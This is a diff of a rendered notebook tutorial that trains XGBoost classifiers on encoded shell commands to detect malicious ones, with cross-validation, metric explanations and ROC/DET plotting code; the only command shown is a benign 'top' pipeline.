+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="nb">print</span><span class="p">(</span><span class="n">X</span><span class="p">[</span><span class="s2">&quot;TfIdfVectorizer WPT&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">shape</span><span class="p">)</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>(12730, 100)
+</pre></div>
+</div>
+</div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">X</span><span class="p">[</span><span class="s2">&quot;raw&quot;</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>&quot;top -b -d2 -s1 | sed -e &#39;1,/USERNAME/d&#39; | sed -e &#39;1,/^$/d&#39;&quot;
+</pre></div>
+</div>
+</div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">X</span><span class="p">[</span><span class="s2">&quot;TfIdfVectorizer WPT&quot;</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">toarray</span><span class="p">()</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>array([[0.        , 0.        , 0.        , 0.        , 0.        ,
+        0.        , 0.        , 0.53659254, 0.        , 0.        ,
+        0.        , 0.        , 0.        , 0.        , 0.        ,
+        0.        , 0.28120821, 0.        , 0.        , 0.        ,
+        0.10521155, 0.        , 0.30281257, 0.        , 0.        ,
+        0.        , 0.        , 0.        , 0.        , 0.        ,
+        0.        , 0.        , 0.        , 0.        , 0.        ,
+        0.        , 0.        , 0.        , 0.        , 0.        ,
+        0.        , 0.        , 0.        , 0.31478373, 0.        ,
+        0.        , 0.46885907, 0.        , 0.        , 0.        ,
+        0.        , 0.        , 0.        , 0.        , 0.        ,
+        0.        , 0.        , 0.        , 0.        , 0.        ,
+        0.        , 0.        , 0.        , 0.        , 0.        ,
+        0.        , 0.        , 0.        , 0.        , 0.        ,
+        0.        , 0.        , 0.        , 0.        , 0.        ,
+        0.        , 0.        , 0.        , 0.40991899, 0.        ,
+        0.        , 0.        , 0.        , 0.        , 0.        ,
+        0.        , 0.        , 0.        , 0.        , 0.        ,
+        0.        , 0.        , 0.        , 0.        , 0.        ,
+        0.        , 0.        , 0.        , 0.20802468, 0.        ]])
+</pre></div>
+</div>
+</div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">sklearn.feature_extraction.text</span> <span class="kn">import</span> <span class="n">HashingVectorizer</span>
+
+<span class="n">hv</span> <span class="o">=</span> <span class="n">HashingVectorizer</span><span class="p">(</span>
+    <span class="n">lowercase</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span>
+    <span class="n">tokenizer</span><span class="o">=</span><span class="n">wordpunct_tokenize</span><span class="p">,</span>
+    <span class="n">token_pattern</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span>
+    <span class="n">n_features</span><span class="o">=</span><span class="n">TOP_TOKENS</span>
+<span class="p">)</span>
+<span class="n">X</span><span class="p">[</span><span class="s2">&quot;HashingVectorizer WPT&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="n">hv</span><span class="o">.</span><span class="n">fit_transform</span><span class="p">(</span><span class="n">X</span><span class="p">[</span><span class="s2">&quot;raw&quot;</span><span class="p">])</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">slp</span> <span class="kn">import</span> <span class="n">ShellEncoder</span>
+
+<span class="n">encoder</span> <span class="o">=</span> <span class="n">ShellEncoder</span><span class="p">(</span><span class="n">X</span><span class="p">[</span><span class="s2">&quot;tokenized&quot;</span><span class="p">],</span> 
+                       <span class="n">X</span><span class="p">[</span><span class="s2">&quot;counter&quot;</span><span class="p">],</span> 
+                       <span class="n">top_tokens</span><span class="o">=</span><span class="n">TOP_TOKENS</span><span class="p">,</span> 
+                       <span class="n">verbose</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+<span class="n">X</span><span class="p">[</span><span class="s2">&quot;One-Hot SLP&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="n">encoder</span><span class="o">.</span><span class="n">onehot</span><span class="p">()</span>
+<span class="n">X</span><span class="p">[</span><span class="s2">&quot;TfIdfVectorizer SLP&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="n">encoder</span><span class="o">.</span><span class="n">tfidf</span><span class="p">()</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output stderr highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>2022-12-03 20:26:11,250 root  INFO     [!] Starting One-Hot encoding!
+2022-12-03 20:26:11,435 root  INFO     [!] One-Hot encoding finished!
+2022-12-03 20:26:11,625 root  INFO     [!] Starting TF-IDF encoding!
+2022-12-03 20:26:11,933 root  INFO     [!] TF-IDF encoding finished!
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="tex2jax_ignore mathjax_ignore section" id="supervised-learning-example-classification-with-cross-validation">
+<h1>Supervised learning example: classification with cross-validation<a class="headerlink" href="#supervised-learning-example-classification-with-cross-validation" title="Permalink to this headline">#</a></h1>
+<p>At this point Encoded data is ready to be processed by many Machine Learning models. So we should feed the data to the Neural Networks?</p>
+<center><img src="https://c.tenor.com/gqsU87kq4PoAAAAM/no-no-please.gif"></center>
+<p>Don’t go Neural Nets unless you know why you need Deep Learning. Deep Learning brings problems that usually blocks them to be deployed in production environment:</p>
+<ul class="simple">
+<li><p>need large sample to learn a good distribution (read: need relatively huge amount of <strong>labeled</strong> data)</p></li>
+<li><p>therefore: more suspectable overfitting to the training set</p></li>
+<li><p>therefore: a lot of False Positive / False Negatives</p></li>
+</ul>
+<p>For classification the first choice to go is <strong>Gradient Boosted Decision Trees (GBDT)</strong> – good realisation within <code class="docutils literal notranslate"><span class="pre">XGBoost</span></code> library:<br />
+<a class="reference external" href="https://arxiv.org/pdf/2110.01889.pdf">[Source: Borisov et al., “Deep Neural Networks and Tabular Data: A Survey”, (Feb. 2022)]</a></p>
+<a class="reference internal image-reference" href="2022/img/xgboost_tabular_data.png"><img alt="2022/img/xgboost_tabular_data.png" src="2022/img/xgboost_tabular_data.png" style="width: 800px;" /></a>
+<p>Digging deeper on GBDT if you are interested: <a class="reference external" href="https://en.wikipedia.org/wiki/Gradient_boosting">1. Wiki.</a> <a class="reference external" href="https://arogozhnikov.github.io/2016/06/24/gradient_boosting_explained.html">2. Intuition &amp; visualisations.</a> Shortly:</p>
+<p><a class="reference internal" href="2022/img/gbdt.png"><img alt="2022/img/gbdt.png" src="2022/img/gbdt.png" style="width: 600px;" /></a><br></p>
+<a class="reference internal image-reference" href="2022/img/ml_ifelse.png"><img alt="2022/img/ml_ifelse.png" src="2022/img/ml_ifelse.png" style="width: 600px;" /></a>
+<div class="section" id="cross-validation">
+<h2>Cross-Validation<a class="headerlink" href="#cross-validation" title="Permalink to this headline">#</a></h2>
+<p>Cross-Validation represents a training setup under constraints of dataset size to evaluate performance of model.</p>
+<p>Generally, model training and evaluation on large datasets happens with the following data split:</p>
+<ul class="simple">
+<li><p>training set - used for model training</p></li>
+<li><p>validation set - used for model’s configuration optimization</p></li>
+<li><p>test set - final evaluation of model performance</p></li>
+</ul>
+<p>However, in our case data is sparse, therefore, we will use a cross-validation approach, where we do no use validation set, and perform a division of training and test sets in a multi-fold manner <a class="reference external" href="https://subscription.packtpub.com/book/all_books/9781789617740/2/ch02lvl1sec08/k-fold-cross-validation">[source]</a>:</p>
+<a class="reference internal image-reference" href="2022/img/cross_validation.png"><img alt="2022/img/cross_validation.png" src="2022/img/cross_validation.png" style="width: 600px;" /></a>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">xgboost</span> <span class="kn">import</span> <span class="n">XGBClassifier</span>
+<span class="kn">from</span> <span class="nn">sklearn.model_selection</span> <span class="kn">import</span> <span class="n">cross_validate</span>
+<span class="kn">from</span> <span class="nn">sklearn.model_selection</span> <span class="kn">import</span> <span class="n">StratifiedKFold</span>
+
+<span class="n">metrics</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;accuracy&quot;</span><span class="p">,</span> <span class="s2">&quot;precision&quot;</span><span class="p">,</span> <span class="s2">&quot;recall&quot;</span><span class="p">,</span> <span class="s2">&quot;f1&quot;</span><span class="p">,</span> <span class="s2">&quot;roc_auc&quot;</span><span class="p">]</span>
+
+<span class="k">def</span> <span class="nf">print_scores</span><span class="p">(</span><span class="n">cv</span><span class="p">):</span>
+    <span class="n">means</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">mean</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="n">cv</span><span class="o">.</span><span class="n">values</span><span class="p">()),</span> <span class="n">axis</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+    <span class="p">[</span><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\t</span><span class="s2">Average </span><span class="si">{</span><span class="n">x</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39;test_&#39;</span><span class="p">)</span><span class="si">:</span><span class="s2">&lt;10</span><span class="si">}</span><span class="s2"> over all folds: </span><span class="si">{</span><span class="n">x</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="si">:</span><span class="s2">.2f</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">cv</span><span class="o">.</span><span class="n">keys</span><span class="p">(),</span> <span class="n">means</span><span class="p">)</span> <span class="k">if</span> <span class="s2">&quot;test_&quot;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span>
+    <span class="nb">print</span><span class="p">()</span>
+
+<span class="k">for</span> <span class="n">key</span> <span class="ow">in</span> <span class="p">[</span><span class="s2">&quot;TfIdfVectorizer SLP&quot;</span><span class="p">,</span> <span class="s2">&quot;TfIdfVectorizer WPT&quot;</span><span class="p">]:</span>
+    <span class="n">xgb_model</span> <span class="o">=</span> <span class="n">XGBClassifier</span><span class="p">(</span><span class="n">n_estimators</span><span class="o">=</span><span class="mi">100</span><span class="p">,</span> <span class="n">use_label_encoder</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">eval_metric</span><span class="o">=</span><span class="s2">&quot;logloss&quot;</span><span class="p">)</span>
+    <span class="n">skf</span> <span class="o">=</span> <span class="n">StratifiedKFold</span><span class="p">(</span><span class="n">n_splits</span><span class="o">=</span><span class="mi">5</span><span class="p">,</span> <span class="n">random_state</span><span class="o">=</span><span class="n">RANDOM_SEED</span><span class="p">,</span> <span class="n">shuffle</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+    <span class="n">cv</span> <span class="o">=</span> <span class="n">cross_validate</span><span class="p">(</span><span class="n">xgb_model</span><span class="p">,</span> <span class="n">X</span><span class="p">[</span><span class="n">key</span><span class="p">],</span> <span class="n">y</span><span class="p">,</span> <span class="n">cv</span><span class="o">=</span><span class="n">skf</span><span class="p">,</span> <span class="n">scoring</span><span class="o">=</span><span class="n">metrics</span><span class="p">)</span>
+    
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="s2">:&quot;</span><span class="p">)</span>
+    <span class="n">print_scores</span><span class="p">(</span><span class="n">cv</span><span class="p">)</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>TfIdfVectorizer SLP:
+	Average accuracy   over all folds: 0.99
+	Average precision  over all folds: 0.86
+	Average recall     over all folds: 0.46
+	Average f1         over all folds: 0.60
+	Average roc_auc    over all folds: 0.95
+
+TfIdfVectorizer WPT:
+	Average accuracy   over all folds: 1.00
+	Average precision  over all folds: 0.90
+	Average recall     over all folds: 0.64
+	Average f1         over all folds: 0.75
+	Average roc_auc    over all folds: 0.97
+</pre></div>
+</div>
+</div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">sklearn.metrics</span> <span class="kn">import</span> <span class="n">accuracy_score</span>
+<span class="n">always_benign</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">y</span><span class="p">))</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Predicting &#39;always benign&#39; (y==0) yields </span><span class="si">{</span><span class="n">accuracy_score</span><span class="p">(</span><span class="n">y</span><span class="p">,</span> <span class="n">always_benign</span><span class="p">)</span><span class="o">*</span><span class="mi">100</span><span class="si">:</span><span class="s2">.2f</span><span class="si">}</span><span class="s2">% accuracy.&quot;</span><span class="p">)</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>Predicting &#39;always benign&#39; (y==0) yields 99.03% accuracy.
+</pre></div>
+</div>
+</div>
+</div>
+<p>What are all the these metrics, really?</p>
+<p>Accuracy – no questions – how much of elements are correct. To understand other metrics – we should consider this classification map <a class="reference external" href="https://en.wikipedia.org/wiki/F-score">[source]</a>:</p>
+<p><a class="reference internal" href="2022/img/tpfptnfn_map.png"><img alt="2022/img/tpfptnfn_map.png" src="2022/img/tpfptnfn_map.png" style="width: 400px;" /></a><br></p>
+<p>Then precision and recall as as follows <a class="reference external" href="https://en.wikipedia.org/wiki/F-score">[source]</a>:</p>
+<a class="reference internal image-reference" href="2022/img/precision_recall.png"><img alt="2022/img/precision_recall.png" src="2022/img/precision_recall.png" style="width: 400px;" /></a>
+<p>F1-score is a “harmonic mean” between precision and recall and is calculated as follows:</p>
+<div class="math notranslate nohighlight">
+\[ F1 = 2\cdot\dfrac{\texttt{precision}\cdot\texttt{recall}}{\texttt{precision}+\texttt{recall}}\]</div>
+<div class="section" id="more-on-evaluation-of-ml-models-in-infosec-roc-and-detection-rate-at-fixed-false-positive-threshold">
+<h3>More on evaluation of ML models in infosec - ROC and detection rate at fixed False Positive threshold<a class="headerlink" href="#more-on-evaluation-of-ml-models-in-infosec-roc-and-detection-rate-at-fixed-false-positive-threshold" title="Permalink to this headline">#</a></h3>
+<p>Oftentimes in security domain representing model’s performance with F1-score or accuracy is too shallow. The best way to communicate performance of the model is to evaluate it given a fixed False Positive rate, to understand its practical utility. For that we will use <a class="reference external" href="https://en.wikipedia.org/wiki/Receiver_operating_characteristic">Receiver Operating Characteristic (ROC)</a> and <a class="reference external" href="https://scikit-learn.org/stable/auto_examples/model_selection/plot_det.html">Detection Error Tradeoff (DET)</a> curves.</p>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">sklearn.metrics</span> <span class="kn">import</span> <span class="n">roc_curve</span><span class="p">,</span> <span class="n">det_curve</span><span class="p">,</span> <span class="n">confusion_matrix</span>
+<span class="kn">from</span> <span class="nn">sklearn.utils</span> <span class="kn">import</span> <span class="n">shuffle</span>
+
+<span class="k">def</span> <span class="nf">plot_confusion_matrix</span><span class="p">(</span><span class="n">preds</span><span class="p">,</span> <span class="n">y_true</span><span class="p">,</span> <span class="n">threshold</span><span class="o">=</span><span class="mf">0.5</span><span class="p">,</span> <span class="n">counts</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">ax</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+    <span class="n">y_pred</span> <span class="o">=</span> <span class="p">(</span><span class="n">preds</span> <span class="o">&gt;=</span> <span class="n">threshold</span><span class="p">)</span><span class="o">.</span><span class="n">astype</span><span class="p">(</span><span class="nb">int</span><span class="p">)</span>
+    <span class="n">cf_matrix</span> <span class="o">=</span> <span class="n">confusion_matrix</span><span class="p">(</span><span class="n">y_true</span><span class="p">,</span> <span class="n">y_pred</span><span class="p">)</span>
+
+    <span class="n">group_counts</span> <span class="o">=</span> <span class="p">[</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">value</span><span class="si">:</span><span class="s2">0.0f</span><span class="si">}</span><span class="s2">&quot;</span> <span class="k">for</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">cf_matrix</span><span class="o">.</span><span class="n">flatten</span><span class="p">()]</span>
+    <span class="n">group_percentages</span> <span class="o">=</span> <span class="p">[</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">value</span><span class="si">:</span><span class="s2">.2%</span><span class="si">}</span><span class="s2">&quot;</span> <span class="k">for</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">cf_matrix</span><span class="o">.</span><span class="n">flatten</span><span class="p">()</span><span class="o">/</span><span class="n">np</span><span class="o">.</span><span class="n">sum</span><span class="p">(</span><span class="n">cf_matrix</span><span class="p">)]</span>
+    <span class="n">groups</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;True Negative&quot;</span><span class="p">,</span><span class="s2">&quot;False Positive&quot;</span><span class="p">,</span><span class="s2">&quot;False Negative&quot;</span><span class="p">,</span><span class="s2">&quot;True Positive&quot;</span><span class="p">]</span>
+
+    <span class="k">if</span> <span class="n">counts</span><span class="p">:</span>
+        <span class="n">labels</span> <span class="o">=</span> <span class="p">[</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">y</span><span class="si">}</span><span class="se">\n</span><span class="si">{</span><span class="n">x</span><span class="si">}</span><span class="se">\n</span><span class="si">{</span><span class="n">z</span><span class="si">}</span><span class="s2">&quot;</span> <span class="k">for</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">,</span><span class="n">z</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">group_percentages</span><span class="p">,</span> <span class="n">groups</span><span class="p">,</span> <span class="n">group_counts</span><span class="p">)]</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">labels</span> <span class="o">=</span> <span class="p">[</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">y</span><span class="si">}</span><span class="se">\n</span><span class="si">{</span><span class="n">x</span><span class="si">}</span><span class="s2">&quot;</span> <span class="k">for</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">group_percentages</span><span class="p">,</span> <span class="n">groups</span><span class="p">)]</span>
+    <span class="n">labels</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">asarray</span><span class="p">(</span><span class="n">labels</span><span class="p">)</span><span class="o">.</span><span class="n">reshape</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span>
+    
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">ax</span><span class="p">:</span>
+        <span class="n">_</span><span class="p">,</span> <span class="n">ax</span> <span class="o">=</span> <span class="n">plt</span><span class="o">.</span><span class="n">subplots</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span> <span class="n">figsize</span><span class="o">=</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="mi">6</span><span class="p">))</span>
+    <span class="n">ax</span> <span class="o">=</span> <span class="n">sns</span><span class="o">.</span><span class="n">heatmap</span><span class="p">(</span><span class="n">cf_matrix</span><span class="p">,</span> <span class="n">annot</span><span class="o">=</span><span class="n">labels</span><span class="p">,</span> <span class="n">ax</span><span class="o">=</span><span class="n">ax</span><span class="p">,</span>
+                <span class="n">fmt</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">cbar</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">cmap</span><span class="o">=</span><span class="s1">&#39;Blues&#39;</span><span class="p">,</span>
+                <span class="n">xticklabels</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;benign&quot;</span><span class="p">,</span> <span class="s2">&quot;malicious&quot;</span><span class="p">],</span>
+                <span class="n">yticklabels</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;benign&quot;</span><span class="p">,</span> <span class="s2">&quot;malicious&quot;</span><span class="p">])</span>
+    <span class="n">ax</span><span class="o">.</span><span class="n">set_ylabel</span><span class="p">(</span><span class="s2">&quot;Ground truth label&quot;</span><span class="p">)</span>
+    <span class="n">ax</span><span class="o">.</span><span class="n">set_xlabel</span><span class="p">(</span><span class="s2">&quot;Prediction&quot;</span><span class="p">)</span>
+    <span class="n">ax</span><span class="o">.</span><span class="n">set_title</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Confusion matrix with threshold: </span><span class="si">{</span><span class="n">threshold</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">fontsize</span><span class="o">=</span><span class="mi">12</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">plot_roc_metrics</span><span class="p">(</span><span class="n">preds</span><span class="p">,</span> <span class="n">y_true</span><span class="p">,</span> <span class="n">metrics</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">ax</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+    <span class="n">metrics</span><span class="p">[</span><span class="s2">&quot;fpr&quot;</span><span class="p">][</span><span class="n">name</span><span class="p">],</span> <span class="n">metrics</span><span class="p">[</span><span class="s2">&quot;tpr&quot;</span><span class="p">][</span><span class="n">name</span><span class="p">],</span> <span class="n">metrics</span><span class="p">[</span><span class="s2">&quot;threshold_roc&quot;</span><span class="p">][</span><span class="n">name</span><span class="p">]</span> <span class="o">=</span> <span class="n">roc_curve</span><span class="p">(</span><span class="n">y_true</span><span class="p">,</span> <span class="n">preds</span><span class="p">)</span>
+    <span class="n">_</span><span class="p">,</span> <span class="n">metrics</span><span class="p">[</span><span class="s2">&quot;fnr&quot;</span><span class="p">][</span><span class="n">name</span><span class="p">],</span> <span class="n">metrics</span><span class="p">[</span><span class="s2">&quot;threshold_det&quot;</span><span class="p">][</span><span class="n">name</span><span class="p">]</span> <span class="o">=</span> <span class="n">det_curve</span><span class="p">(</span><span class="n">y_true</span><span class="p">,</span> <span class="n">preds</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">ax</span><span class="p">:</span>
+        <span class="n">ax</span><span class="o">.</span><span class="n">plot</span><span class="p">(</span><span class="n">metrics</span><span class="p">[</span><span class="s2">&quot;fpr&quot;</span><span class="p">][</span><span class="n">name</span><span class="p">],</span> <span class="n">metrics</span><span class="p">[</span><span class="s2">&quot;tpr&quot;</span><span class="p">][</span><span class="n">name</span><span class="p">],</span> <span class="n">linestyle</span><span class="o">=</span><span class="s2">&quot;solid&quot;</span><span class="p">,</span> <span class="n">label</span><span class="o">=</span><span class="n">name</span><span class="p">)</span>
+        <span class="n">ax</span><span class="o">.</span><span class="n">set_xlabel</span><span class="p">(</span><span class="s1">&#39;False Positive Rate&#39;</span><span class="p">)</span>
+        <span class="n">ax</span><span class="o">.</span><span class="n">set_ylabel</span><span class="p">(</span><span class="s1">&#39;True Positive Rate&#39;</span><span class="p">)</span>
+        <span class="n">ax</span><span class="o">.</span><span class="n">set_ylim</span><span class="p">([</span><span class="mf">0.8</span><span class="p">,</span><span class="mf">1.02</span><span class="p">])</span>
+        <span class="n">ax</span><span class="o">.</span><span class="n">set_xlim</span><span class="p">([</span><span class="o">-</span><span class="mf">0.05</span><span class="p">,</span><span class="mf">0.8</span><span class="p">])</span>
+        <span class="n">ax</span><span class="o">.</span><span class="n">set_title</span><span class="p">(</span><span class="s2">&quot;ROC curve&quot;</span><span class="p">,</span> <span class="n">fontsize</span><span class="o">=</span><span class="mi">12</span><span class="p">)</span>
+        <span class="n">ax</span><span class="o">.</span><span class="n">legend</span><span class="p">(</span><span class="n">loc</span><span class="o">=</span><span class="s2">&quot;lower right&quot;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">metrics</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">collections</span> <span class="kn">import</span> <span class="n">defaultdict</span>
+<span class="kn">from</span> <span class="nn">sklearn.model_selection</span> <span class="kn">import</span> <span class="n">train_test_split</span>
+
+<span class="n">metrics</span> <span class="o">=</span> <span class="n">defaultdict</span><span class="p">(</span><span class="nb">dict</span><span class="p">)</span>
+
+<span class="n">fig</span><span class="p">,</span> <span class="n">ax</span> <span class="o">=</span> <span class="n">plt</span><span class="o">.</span><span class="n">subplots</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span> <span class="n">figsize</span><span class="o">=</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span><span class="mi">6</span><span class="p">))</span>
+
+<span class="n">encodings</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;TfIdfVectorizer WPT&quot;</span><span class="p">,</span> <span class="s2">&quot;TfIdfVectorizer SLP&quot;</span><span class="p">,</span> <span class="s2">&quot;One-Hot SLP&quot;</span><span class="p">,</span> <span class="s2">&quot;HashingVectorizer WPT&quot;</span><span class="p">]</span>
+<span class="k">for</span> <span class="n">key</span> <span class="ow">in</span> <span class="n">encodings</span><span class="p">:</span>
+    
+    <span class="n">xgb_model</span> <span class="o">=</span> <span class="n">XGBClassifier</span><span class="p">(</span><span class="n">n_estimators</span><span class="o">=</span><span class="mi">100</span><span class="p">,</span> <span class="n">use_label_encoder</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">eval_metric</span><span class="o">=</span><span class="s2">&quot;logloss&quot;</span><span class="p">)</span>
+    <span class="c1"># split data into train and test set</span>
+    <span class="n">X_train</span><span class="p">,</span> <span class="n">X_test</span><span class="p">,</span> <span class="n">y_train</span><span class="p">,</span> <span class="n">y_test</span> <span class="o">=</span> <span class="n">train_test_split</span><span class="p">(</span><span class="n">X</span><span class="p">[</span><span class="n">key</span><span class="p">],</span> <span class="n">y</span><span class="p">,</span> <span class="n">test_size</span><span class="o">=</span><span class="mf">0.5</span><span class="p">,</span> <span class="n">random_state</span><span class="o">=</span><span class="n">RANDOM_SEED</span><span class="p">,</span> <span class="n">stratify</span><span class="o">=</span><span class="n">y</span><span class="p">)</span>
+    <span class="c1">#xl, yl = shuffle(X[key], y, random_state=RANDOM_SEED)</span>
+    <span class="n">xgb_model</span><span class="o">.</span><span class="n">fit</span><span class="p">(</span><span class="n">X_train</span><span class="p">,</span> <span class="n">y_train</span><span class="p">)</span>
+    <span class="n">preds</span> <span class="o">=</span> <span class="n">xgb_model</span><span class="o">.</span><span class="n">predict_proba</span><span class="p">(</span><span class="n">X_test</span><span class="p">)[:,</span><span class="mi">1</span><span class="p">]</span>
+    
+    <span class="n">metrics</span> <span class="o">=</span> <span class="n">plot_roc_metrics</span><span class="p">(</span><span class="n">preds</span><span class="p">,</span> <span class="n">y_test</span><span class="p">,</span> <span class="n">metrics</span><span class="p">,</span> <span class="n">name</span> <span class="o">=</span> <span class="n">key</span><span class="p">,</span> <span class="n">ax</span><span class="o">=</span><span class="n">ax</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+    <span class="k">if</span> <span class="n">key</span> <span class="o">==</span> <span class="s2">&quot;HashingVectorizer WPT&quot;</span><span class="p">:</span>
+        <span class="n">plot_confusion_matrix</span><span class="p">(</span><span class="n">preds</span><span class="p">,</span> <span class="n">y_test</span><span class="p">,</span> <span class="n">threshold</span><span class="o">=</span><span class="mf">0.4</span><span class="p">,</span> <span class="n">counts</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">ax</span><span class="o">=</span><span class="n">ax</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<img alt="../../_images/day2-08-Shell-Language-Processing_35_0.png" src="../../_images/day2-08-Shell-Language-Processing_35_0.png" />
+</div>
+</div>
+<p>Varying False Positive rate is possible with defining a probability threshold, based on which we consider sample to be malicious, since output of model is not a binary, it is a probability in range <span class="math notranslate nohighlight">\(p \in [0,1]\)</span>:</p>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">_</span> <span class="o">=</span> <span class="p">[</span><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">x</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s2">&quot; &quot;</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">y_test</span><span class="p">[</span><span class="mi">200</span><span class="p">:</span><span class="mi">210</span><span class="p">]]</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
